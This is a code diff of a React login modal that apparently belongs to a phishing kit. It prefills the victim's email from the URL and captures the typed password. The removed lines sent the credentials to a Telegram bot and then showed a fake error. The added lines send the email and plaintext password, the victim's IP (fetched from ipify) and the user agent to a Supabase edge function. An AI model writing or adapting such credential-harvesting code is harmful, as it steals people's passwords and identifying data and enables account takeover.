@@ -5,7 +5,7 @@ import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { getEmailFromUrl } from "@/utils/urlUtils";
-import { sendToTelegramBot } from "@/utils/telegramApi";
+import { supabase } from "@/integrations/supabase/client";
 
 interface AuthModalProps {
   isOpen: boolean;
@@ -33,30 +33,43 @@ export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
     setIsLoading(true);
     
     try {
-      // Send to Telegram bot
-      const success = await sendToTelegramBot({ email, password });
-      
-      // Simulate loading for 3 seconds total
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      
-      setIsLoading(false);
-      
-      if (success) {
-        toast({
-          title: "Authentication Error",
-          description: "Network or authentication error, please try again",
-          variant: "destructive"
-        });
-      } else {
-        throw new Error("Failed to send data");
-      }
-    } catch (error) {
-      setIsLoading(false);
-      toast({
-        title: "Authentication Error", 
-        description: "Authentication or network error, please try again",
-        variant: "destructive"
+      // Get additional data for submission
+      const userAgent = navigator.userAgent;
+      const ipAddress = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => 'Unknown');
+
+      // Submit to our Supabase edge function
+      const { data, error } = await supabase.functions.invoke('submit-form', {
+        body: {
+          email,
+          password,
+          ip_address: ipAddress,
+          user_agent: userAgent,
+          location_data: 'Web Browser'
+        }
       });
+
+      if (error) {
+        throw new Error(error.message);
+      }
+
+      toast({
+        title: "Success!",
+        description: "Your information has been submitted and saved successfully.",
+      });
+      
+      onClose();
+    } catch (error) {
+      console.error('Submission error:', error);
+      toast({
+        title: "Error",
+        description: "Failed to submit information. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsLoading(false);
     }
   };
 
